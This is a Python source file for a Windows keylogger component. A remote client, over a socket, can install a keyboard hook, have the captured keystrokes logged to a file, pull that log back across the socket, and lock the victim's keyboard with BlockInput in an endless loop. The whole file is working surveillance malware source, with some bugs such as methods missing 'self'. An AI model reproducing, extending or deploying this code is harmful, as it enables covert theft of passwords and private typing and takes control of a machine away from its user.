from ctypes import *
from ctypes.wintypes import DWORD, MSG
import KeyLog
import threading

class KeyboardController():
    def __init__(self, clientSocket):
        self.__client = clientSocket
        self.HOOKPROC = WINFUNCTYPE(c_int, c_int, c_int, POINTER(DWORD))
        self.keyhook = KeyLog.KeyHook()

    def startKlog(self):
        pointer = self.HOOKPROC(KeyLog.hookProc)
        if self.keyhook.installHookProc(pointer) == True:
            try:
                msg = MSG()
                KeyLog.user32.GetMessageA(byref(msg), 0, 0, 0) 
            except:
                self.keyhook.unistallHookProc()
                return
        
    def startListening(self):
        request = ""
        while True:
            request = self.__client.recv(1024).decode("utf-8")
            if not request:
                break
            if request == "lock":
                self.lockKeyboard()
            if request == "hook":
                self.hookKey()
            elif request == "unhook":   
                self.unhookKey()
            elif request == "print":
                self.printKey()
            else: #Quit
                self.unhookKey()
                return

    def hookKey(self):
        tkLog = threading.Thread(target=self.startKlog) 
        tkLog.daemon = True
        open(KeyLog.FilLogPath, "w")
        tkLog.start()
    
    def unhookKey(self):
        self.keyhook.unistallHookProc()

    def printKey(self):
        self.keyhook.unistallHookProc()
        s = ""
        with open(KeyLog.FilLogPath, 'r') as f:
            s = f.read()
        f.close()
        if s=="": 
            ss = "No"
            self.__client.sendall(ss.encode('utf-8'))
        else:
            ss = "Yes"
            self.__client.sendall(ss.encode('utf-8'))
            check = self.__client.recv(10)
            open(KeyLog.FilLogPath, "w")
            self.__client.sendall(s.encode('utf-8'))

    def lockKeyboard():
        while True:
            windll.user32.BlockInput(True);

    def unlockKeyboard():
        windll.user32.BlockInput(False); 

